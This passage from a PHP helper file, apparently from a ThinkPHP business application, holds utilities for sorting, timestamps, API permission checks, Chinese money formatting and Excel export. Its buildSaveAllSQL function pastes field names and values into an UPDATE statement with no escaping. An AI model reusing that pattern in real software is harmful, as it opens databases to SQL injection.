        $data[$options['name_key']] = $options['name'];
    }

    $results = [];
    foreach ($options['tables'] as $tableName) {
        $results[] = M($tableName)->where($where)->save($data);
    }
    return !in_array(false, $results, true);
}

function rentalToRound($rental)
{
    return round($rental, 0);
}

function propertyToRound($property)
{
    return round($property, 0);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/**
 * 获取默认数据
 * @param string $relativePath
 * @param string $ext
 * @return array
 * User: hjun
 * Date: 2018-09-12 09:30:31
 * Update: 2018-09-12 09:30:31
 * Version: 1.00
 */
function getDefaultData($relativePath = '', $ext = 'json')
{
    $rootPath = realpath(COMMON_PATH . '/Default/') . '/';
    $path = "{$rootPath}$relativePath.{$ext}";
    $data = file_get_contents($path);
    if ($ext === 'json') {
        $data = jsonDecodeToArr($data);
    } elseif ($ext === 'php') {
        $data = unserialize($data);
    }
    return $data;
}

/**
 * 字符串转时间戳 转失败返回原值
 * @param string $str
 * @return string|int
 * User: hjun
 * Date: 2019-05-23 20:48:29
 * Update: 2019-05-23 20:48:29
 * Version: 1.00
 */
function str_to_time($str = '')
{
    $time = strtotime($str);
    // 转失败，验证是否本身就是时间戳 如果不是，返回0
    if (false === $time) {
        $date = date('Y', $str);
        if ($date === false || $date === '1970') {
            return 0;
        }
        return $str;
    }
    return $time;
}

/**
 * 判断是否是昨天
 * @param $time
 * @return boolean
 * User: hjun
 * Date: 2019-03-15 11:43:28
 * Update: 2019-03-15 11:43:28
 * Version: 1.00
 */
function isYesterday($time = NOW_TIME)
{
    // 获取今天的时间范围
    $todayRange = getDayRange(NOW_TIME);
    // 获取昨天的时间范围
    $yesterdayRange = getDayRange($todayRange[0] - 1);
    if ($time >= $yesterdayRange[0] && $time <= $yesterdayRange[1]) {
        return true;
    }
    return false;
}


/**
 * 构建批量更新SQL语句
 * @param string $table
 * @param array $dataList
 * @param string $caseField
 * @return string
 * User: hjun
 * Date: 2019-05-23 21:41:19
 * Update: 2019-05-23 21:41:19
 * Version: 1.00
 */
function buildSaveAllSQL($table = '', $dataList = [], $caseField = '')
{
    $sql = "UPDATE {$table} SET ";
    $case = [];
    foreach ($dataList[0] as $field => $value) {
        if ($field == $caseField) {
            continue;
        }
        $sql .= "{$field} = CASE {$caseField} ";
        foreach ($dataList as $val) {
            $sql .= "WHEN {$val[$caseField]} THEN '{$val[$field]}' ";
            if (!in_array($val[$caseField], $case)) {
                $case[] = $val[$caseField];
            }
        }
        $sql .= "END, ";
    }
    // 去掉最后的逗号
    $sql = substr($sql, 0, strrpos($sql, ','));
    $case = implode(',', $case);
    $sql .= " WHERE {$caseField} IN ({$case})";
    return $sql;
}


/**
 * If you want to keep the order when two members compare as equal, use this.
 * @param $array
 * @param $cmp_function
 * @return void
 * User: hjun
 * Date: 2018-12-20 17:10:29
 * Update: 2018-12-20 17:10:29
 * Version: 1.00
 */
function stable_uasort(&$array, $cmp_function)
{
    if (count($array) < 2) {
        return;
    }
    $halfway = count($array) / 2;
    $array1 = array_slice($array, 0, $halfway, TRUE);
    $array2 = array_slice($array, $halfway, NULL, TRUE);

    stable_uasort($array1, $cmp_function);
    stable_uasort($array2, $cmp_function);
    if (call_user_func($cmp_function, end($array1), reset($array2)) < 1) {
        $array = $array1 + $array2;
        return;
    }
    $array = array();
    reset($array1);
    reset($array2);
    while (current($array1) !== false && current($array2) !== false) {
        if (call_user_func($cmp_function, current($array1), current($array2)) < 1) {
            $array[key($array1)] = current($array1);
            next($array1);
        } else {
            $array[key($array2)] = current($array2);
            next($array2);
        }
    }
    while (current($array1) !== false) {
        $array[key($array1)] = current($array1);
        next($array1);
    }
    while (current($array2) !== false) {
        $array[key($array2)] = current($array2);
        next($array2);
    }
    return;
}

/**
 * 二维数组排序
 * @param array $arr 二维数据
 * @param string $keys 根据哪个键值排序
 * @param string $type 排序类型 升降
 * @return array ['code'=>200,'msg'=>'','data'=>[]]
 * User: hj
 * Date: 2017-10-12 10:36:43
 * Desc: 二维数组排序
 * Update: 2017-10-12 10:36:44
 * Version: 1.0
 */
function array_sort($arr, $keys, $type = 'desc')
{
    global $array_sort_type;
    $array_sort_type = strtolower($type);
    $key_value = $new_array = array();
    foreach ($arr as $k => $v) {
        $key_value[$k] = $v[$keys];
    }
    stable_uasort($key_value, function ($a, $b) {
        $a = is_numeric($a) ? (double)$a : $a;
        $b = is_numeric($b) ? (double)$b : $b;
        if ($a == $b) {
            return 0;
        }
        global $array_sort_type;
        if ($array_sort_type === 'asc') {
            return ($a < $b) ? -1 : 1;
        } else {
            return ($a < $b) ? 1 : -1;
        }
    });
    unset($array_sort_type);
    reset($key_value);
    foreach ($key_value as $k => $v) {
        $new_array[] = $arr[$k];
    }
    return $new_array;
}


/**
 * 检查接口的权限
 * @param array $auth
 * @param string $ctrl
 * @param string $act
 * @return boolean
 * User: hjun
 * Date: 2019-07-01 15:00:57
 * Update: 2019-07-01 15:00:57
 * Version: 1.00
 */
function checkApiAuth($auth = [], $ctrl = null, $act = null)
{
    if (empty($auth)) {
        return false;
    }
    // 获取API对应后台的权限码
    $ctrl = isset($ctrl) ? strtoupper($ctrl) : strtoupper(CONTROLLER_NAME);
    $act = isset($act) ? strtoupper($act) : strtoupper(ACTION_NAME);
    $code = getApiAuthCode("{$ctrl}@{$act}");
    // true 说明不需要检查
    if ($code === true) {
        return true;
    }

    // 先将权限处理成容易判断的格式 => [{ctrl}@{act}, {ctrl}@{act}, {ctrl}@{act}]
    $temp = $auth;
    $auth = [];
    foreach ($temp as $ctrl => $value) {
        foreach ($value as $act => $id) {
            $auth[] = "{$ctrl}@{$act}";
        }
    }
    if (in_array($code, $auth)) {
        return true;
    }
    return false;
}


/**
 * 展示赋值后的模版内容
 * @param string $tpl
 * @param array $data
 * @return string
 * User: hjun
 * Date: 2019-08-13 10:41:46
 * Update: 2019-08-13 10:41:46
 * Version: 1.00
 */
function showTplInfo($tpl = '', $data = array())
{
    $tpl = tplReplace($tpl, $data);
    $tpl = str_replace('<p>', '<div>', $tpl);
    $tpl = str_replace('</p>', '</div>', $tpl);
    return $tpl;
}

function cnyMapUnit($list, $units)
{
    $ul = count($units);
    $xs = array();
    foreach (array_reverse($list) as $x) {
        $l = count($xs);
        if ($x != "0" || !($l % 4)) {
            $n = ($x == '0' ? '' : $x) . ($units[($l - 1) % $ul]);
        } else {
            $n = is_numeric($xs[0][0]) ? $x : '';
        }
        array_unshift($xs, $n);
    }
    return $xs;
}

/**
 * 将数字转为中文大写
 * @param $money
 * @return string
 * User: hjun
 * Date: 2019-08-13 10:42:34
 * Update: 2019-08-13 10:42:34
 * Version: 1.00
 */
function toChineseNumber($money)
{
    $money = round($money, 2);
    $ext = strpos($money, '.') === false ? '整' : '';
    $cnynums = array("零", "壹", "贰", "叁", "肆", "伍", "陆", "柒", "捌", "玖");
    $cnyunits = array("元", "角", "分");
    $cnygrees = array("拾", "佰", "仟", "万", "拾", "佰", "仟", "亿");
    list($int, $dec) = explode(".", $money, 2);
    $dec = array_filter(array($dec[1], $dec[0]));
    $ret = array_merge($dec, array(implode("", cnyMapUnit(str_split($int), $cnygrees)), ""));
    $ret = implode("", array_reverse(cnyMapUnit($ret, $cnyunits)));
    $rt = str_replace(array_keys($cnynums), $cnynums, $ret);
    if ($rt == '元') {
        $rt = '零元';
    }
    return $rt . $ext;
}

/**
 * 获取区号
 * @param int $factoryId
 * @return array
 * User: hjun
 * Date: 2019-01-06 18:36:23
 * Update: 2019-01-06 18:36:23
 * Version: 1.00
 */
function getAreaCode($factoryId = 0)
{
    return [
        ['area_id' => 86, 'code_name' => '+86', 'area_country' => '中国'],
        ['area_id' => 63, 'code_name' => '+63', 'area_country' => '菲律宾'],
        ['area_id' => 65, 'code_name' => '+65', 'area_country' => '新加坡'],
    ];
}


if (!function_exists('array_column')) {

    function array_column($array = [], $column_key = '', $index_key = '')
    {
        $result = [];
        foreach ($array as $value) {
            if (empty($index_key)) {
                $result[] = $value[$column_key];
            } else {
                $result[$value[$index_key]] = $value[$column_key];
            }

        }
        return $result;
    }
}

/**
 * 未设置 空字符串或者null
 * @param $value
 * @return boolean
 * User: hjun
 * Date: 2019-10-16 15:32:02
 * Update: 2019-10-16 15:32:02
 * Version: 1.00
 */
function noSet($value)
{
    if ($value === '' || !isset($value)) {
        return true;
    }
    return false;
}

/**
 * 根据导出Excel导出数据
 * @param $path
 * @param $data
 * @param $fileName
 * @return array ['code'=>200, 'msg'=>'', 'data'=>null]
 * @throws PHPExcel_Exception
 * @throws PHPExcel_Reader_Exception
 * @throws PHPExcel_Writer_Exception
 * User: hjun
 * Date: 2019-10-24 11:09:14
 * Update: 2019-10-24 11:09:14
 * Version: 1.00
 */
function operationExcel($path, $data, $fileName)
{
    vendor("PHPExcel.PHPExcel.IOFactory");
    if (!file_exists($path)) {
        echo '文件模板不存在';
        die();
    }
    $objPHPExcel = PHPExcel_IOFactory::load($path);
    $objPHPExcel->setActiveSheetIndex(0);
    $sheet = $objPHPExcel->getSheet(0);
    $colunms = $sheet->getHighestColumn();
    $rows = $sheet->getHighestRow();
    for ($i = 1; $i <= $rows; $i++) {
        for ($j = 'A'; $j <= $colunms; $j++) {
            $value = trim($sheet->getCell($j . $i)->getValue());
            if (!empty($value)) {
                if (preg_match('/{{(.+)}}/', $value, $match)) {
                    if ($match['1'] == 'fileName') {
                        $objPHPExcel->getActiveSheet()->setCellValue("{$j}{$i}", "{$fileName}");
                    } else {
                        $value = str_replace($match['0'], $data[$match['1']], $value);
                        $objPHPExcel->getActiveSheet()->setCellValue("{$j}{$i}", "{$value}");
                    }
                }
            }
        }
    }
    $objPHPExcel->getActiveSheet()->setTitle($fileName);
    $fileName = "{$fileName}.xls";
    $fileName = iconv("utf-8", "gb2312", $fileName);
    $objPHPExcel->setActiveSheetIndex(0);
    ob_end_clean();//清除缓冲区,避免乱码
    header('Content-Type: application/vnd.ms-excel');
    header("Content-Disposition: attachment;filename=\"$fileName\"");
    header('Cache-Control: max-age=0');

    $objWriter = \PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel5');
    $objWriter->save('php://output'); //文件通过浏览器下载
    exit;
}


/**
 * 根据请求获取导出项
 * @param array $requestArray
 * @param array $fieldArray
 * @return array ['code'=>200, 'msg'=>'', 'data'=>null]
 * User: hdc
 * Date: 2020-02-14 14:18:31
 * Update: 2020-02-14 14:18:31
 * Version: 1.00
 */
function getRequestField($requestArray = [], $fieldArray = [])
{
    $headArr = [];
    foreach ($requestArray as $k => $field) {
        foreach ($fieldArray as $totalField) {
            if ($field == $totalField['value']) {
                $headArr[] = $totalField['name'];
            }
        }
    }
    return $headArr;
}

/**
 * 根据请求获取导出的数据
 * @param array $requestArray
 * @param array $result
 * @return array ['code'=>200, 'msg'=>'', 'data'=>null]
 * User: hdc
 * Date: 2020-02-14 14:18:31
 * Update: 2020-02-14 14:18:31
 * Version: 1.00
 */
function getRequestFieldData($requestArray = [], $result = [])
{
    $data = [];
    foreach ($result as $k => $value) {
        $v = [];
        foreach ($requestArray as $field) {
            $v[$field] = $value[$field];
        }
        $data[] = $v;
    }
    return $data;
}

/**
 * 将秒数转换成时分秒格式
 * @param $seconds
 * @return array ['code'=>200, 'msg'=>'', 'data'=>null]
 * User: hjun
 * Date: 2020-07-01 20:25:42
 * Update: 2020-07-01 20:25:42
 * Version: 1.00
 */
function changeTimeType($seconds)
{
    if ($seconds > 3600) {
        $hours = intval($seconds / 3600);
        $time = $hours . ":" . gmstrftime('%M:%S', $seconds);
    } else {
        $time = gmstrftime('%H:%M:%S', $seconds);
    }
    return $time;
}
